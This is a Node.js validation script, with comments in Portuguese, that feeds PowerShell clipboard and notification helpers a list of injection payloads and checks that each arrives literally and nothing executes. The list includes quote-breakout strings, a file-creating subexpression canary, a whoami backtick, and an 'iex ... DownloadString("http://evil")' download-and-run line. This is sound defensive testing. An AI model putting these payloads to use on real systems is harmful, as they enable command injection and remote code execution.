#!/usr/bin/env node
/**
 * Validação de INTEGRAÇÃO da Fase 1-A — executa os helpers PowerShell de verdade.
 *
 * Separado da suíte e **explicitamente autorizado** por flag, porque a regra desta casa passou
 * a ser: nenhum teste de segurança inicia processo, shell, gerenciador de pacotes ou rede.
 * Aqui o processo real é o objeto da medição, não um efeito colateral — e por isso ele mora
 * fora do `jest`, com autorização na linha de comando.
 *
 *   node scripts/validar-fase-1a-windows.mjs --eu-autorizo
 *
 * O que é verificado, e por quê:
 *
 * | | |
 * |---|---|
 * | payload chega **literal** ao clipboard | é a promessa da Fase 1-A |
 * | nenhum arquivo aparece no diretório temporário | payload que executasse criaria o canário |
 * | canário `$(New-Item ...)` não existe em lugar nenhum | subexpressão do PowerShell não rodou |
 * | ambiente do filho sem segredo | `ambienteMinimo()` valendo no caminho real |
 * | timeout | helper que trava é morto, não pendura |
 * | erro | helper inexistente falha alto |
 * | Unicode | aspa curva já quebrou parser desta casa em 06/09 |
 *
 * O clipboard do usuário é **salvo e restaurado** no fim.
 */
import { execFileSync } from 'node:child_process'
import { mkdtempSync, rmSync, readdirSync, existsSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { dirname } from 'node:path'

const RAIZ = join(dirname(fileURLToPath(import.meta.url)), '..')
const HELPERS = join(RAIZ, 'apps', 'agent', 'scripts')

if (!process.argv.includes('--eu-autorizo')) {
  console.error('Recusado: este script executa processos de verdade. Rode com --eu-autorizo.')
  process.exit(2)
}
if (process.platform !== 'win32') {
  console.error(`Recusado: só faz sentido no Windows real (aqui: ${process.platform}).`)
  process.exit(2)
}

/** Allowlist mínima — o filho não pode ver segredo nenhum. */
const VARIAVEIS_PERMITIDAS = [
  'PATH', 'SystemRoot', 'SystemDrive', 'windir', 'COMSPEC', 'PATHEXT',
  'TEMP', 'TMP', 'APPDATA', 'LOCALAPPDATA', 'USERPROFILE', 'ProgramFiles', 'ProgramData',
  'NUMBER_OF_PROCESSORS', 'PROCESSOR_ARCHITECTURE', 'USERNAME', 'COMPUTERNAME',
]
const ambienteMinimo = () => Object.fromEntries(
  VARIAVEIS_PERMITIDAS.filter((k) => process.env[k] !== undefined).map((k) => [k, process.env[k]]),
)

const trabalho = mkdtempSync(join(tmpdir(), 'rayzen-fase1a-'))
let ok = 0, falhou = 0
const registrar = (nome, passou, detalhe = '') => {
  console.log(`${passou ? '  OK  ' : ' FALHA'} | ${nome}${detalhe ? ' — ' + detalhe : ''}`)
  passou ? ok++ : falhou++
}

function rodar(helper, entrada, timeoutMs = 10_000) {
  return execFileSync('powershell.exe',
    ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', join(HELPERS, helper)],
    { input: entrada, encoding: 'utf-8', timeout: timeoutMs, cwd: trabalho, env: ambienteMinimo(), windowsHide: true })
}

const lerClipboard = () => execFileSync('powershell.exe',
  ['-NoProfile', '-NonInteractive', '-Command', '[Console]::Out.Write((Get-Clipboard -Raw))'],
  { encoding: 'utf-8', timeout: 10_000, windowsHide: true })

// Canário: se o payload FOR interpretado, este arquivo passa a existir.
const canario = join(trabalho, 'CANARIO-EXECUTOU.txt')

const PAYLOADS = [
  ['benigno',            'texto simples de teste'],
  ['aspa dupla',         'x"; Write-Output PWNED; "'],
  ['aspa simples',       "x'; Write-Output PWNED; '"],
  ['ponto e virgula',    'x; Write-Output PWNED'],
  ['pipeline',           `x | Out-File "${canario.replace(/\\/g, '\\\\')}"`],
  ['subexpressao',       `$(New-Item -ItemType File -Path "${canario.replace(/\\/g, '\\\\')}")`],
  ['crase',              '`whoami`'],
  ['and/or',             'x && whoami || whoami'],
  ['quebra de linha',    'linha1\nWrite-Output PWNED'],
  ['unicode aspa curva', 'x”; Write-Output PWNED; “'],
  ['unicode travessao',  'a — b – c ção'],
  ['iex',                'iex (New-Object Net.WebClient).DownloadString("http://evil")'],
  ['expansao de var',    '$env:USERNAME + $ExecutionContext'],
]

console.log(`\nDiretório de trabalho: ${trabalho}`)
console.log(`Usuário: ${process.env.USERNAME} (processo não elevado)\n`)
console.log('── clipboard_write: payload chega literal e nada executa ──')

const clipboardOriginal = (() => { try { return lerClipboard() } catch { return '' } })()

for (const [nome, payload] of PAYLOADS) {
  try {
    rodar('clipboard-write.ps1', payload)
    const lido = lerClipboard().replace(/\r\n/g, '\n').replace(/\n$/, '')
    const esperado = payload.replace(/\r\n/g, '\n')
    registrar(nome, lido === esperado, lido === esperado ? '' : `leu ${JSON.stringify(lido.slice(0, 40))}`)
  } catch (e) {
    registrar(nome, false, `lançou: ${String(e).slice(0, 80)}`)
  }
}

console.log('\n── nada foi executado ──')
registrar('canário não existe', !existsSync(canario))
const sobras = readdirSync(trabalho)
registrar('diretório temporário vazio', sobras.length === 0, sobras.join(', '))

console.log('\n── notify: payload vira dado, com toast real ──')
for (const [nome, payload] of [PAYLOADS[0], PAYLOADS[5], PAYLOADS[10]]) {
  try {
    rodar('notify.ps1', JSON.stringify({ titulo: `Rayzen — ${nome}`, mensagem: payload.slice(0, 250) }))
    registrar(`notify ${nome}`, true, 'toast emitido')
  } catch (e) {
    registrar(`notify ${nome}`, false, String(e).slice(0, 80))
  }
}
registrar('canário continua ausente após notify', !existsSync(canario))

console.log('\n── ambiente do filho não tem segredo ──')
try {
  const vazado = execFileSync('powershell.exe',
    ['-NoProfile', '-NonInteractive', '-Command',
     '[Console]::Out.Write((Get-ChildItem env: | Where-Object { $_.Name -match "TOKEN|SECRET|PASSWORD|KEY|DATABASE_URL" } | Measure-Object).Count)'],
    { encoding: 'utf-8', timeout: 10_000, env: ambienteMinimo(), windowsHide: true })
  registrar('nenhuma variável com TOKEN/SECRET/PASSWORD/KEY', vazado.trim() === '0', `contou ${vazado.trim()}`)
} catch (e) { registrar('ambiente sem segredo', false, String(e).slice(0, 80)) }

console.log('\n── timeout e erro ──')
try {
  execFileSync('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', 'Start-Sleep -Seconds 30'],
    { timeout: 2000, encoding: 'utf-8', windowsHide: true })
  registrar('timeout mata o processo', false, 'não estourou')
} catch (e) {
  registrar('timeout mata o processo', /ETIMEDOUT|timed out|SIGTERM/i.test(String(e)), String(e).slice(0, 60))
}
try {
  rodar('helper-que-nao-existe.ps1', 'x')
  registrar('helper inexistente falha alto', false, 'não lançou')
} catch { registrar('helper inexistente falha alto', true) }

// Restaura o clipboard do usuário — a validação não pode deixar lixo na área de transferência.
try { rodar('clipboard-write.ps1', clipboardOriginal) } catch { /* melhor esforço */ }
rmSync(trabalho, { recursive: true, force: true })

console.log(`\n${ok} ok · ${falhou} falha(s)`)
process.exit(falhou === 0 ? 0 : 1)
